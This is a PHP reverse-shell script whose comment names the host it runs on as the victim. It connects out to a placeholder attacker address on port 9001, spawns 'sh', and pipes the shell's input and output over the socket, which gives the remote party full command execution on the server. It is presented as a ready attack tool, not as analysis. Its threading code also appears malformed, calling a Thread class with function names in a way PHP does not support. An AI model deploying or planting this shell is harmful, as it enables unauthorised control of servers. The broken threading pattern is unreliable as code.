<?php
// El servidor donde se ejecuta (la víctima principal)
// Function to read from socket and write to process
function s2p($socket, $process) {
    while (true) {
        $data = socket_read($socket, 1024);
        if ($data !== false && strlen($data) > 0) {
            fwrite($process['stdin'], $data);
            fflush($process['stdin']);
        }
    }
}

// Function to read from process and write to socket
function p2s($socket, $process) {
    while (true) {
        $data = fread($process['stdout'], 1);
        if ($data !== false && strlen($data) > 0) {
            socket_write($socket, $data, strlen($data));
        }
    }
}

// Create a TCP/IP socket
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    die("socket_create() failed: " . socket_strerror(socket_last_error()) . "\n");
}

// Connect to the server
$result = socket_connect($socket, 'IP_ADDRESS', 9001);
if ($result === false) {
    die("socket_connect() failed: " . socket_strerror(socket_last_error($socket)) . "\n");
}

// Start a shell process
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

$process = proc_open('sh', $descriptorspec, $pipes);
if (!is_resource($process)) {
    die("proc_open failed\n");
}

// Set non-blocking mode for pipes
stream_set_blocking($pipes[0], false);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);

// Create and start threads
$s2p_thread = new Thread('s2p', array($socket, array('stdin' => $pipes[0], 'stdout' => $pipes[1], 'stderr' => $pipes[2])));
$s2p_thread->start();

$p2s_thread = new Thread('p2s', array($socket, array('stdin' => $pipes[0], 'stdout' => $pipes[1], 'stderr' => $pipes[2])));
$p2s_thread->start();

// Wait for threads to finish
try {
    while ($s2p_thread->isRunning() || $p2s_thread->isRunning()) {
        usleep(100000); // Sleep for 100ms
    }
} catch (Exception $e) {
    // Close the socket on keyboard interrupt
    socket_close($socket);
    proc_close($process);
    die("Interrupted\n");
}

// Close the socket and process
socket_close($socket);
proc_close($process);

?>
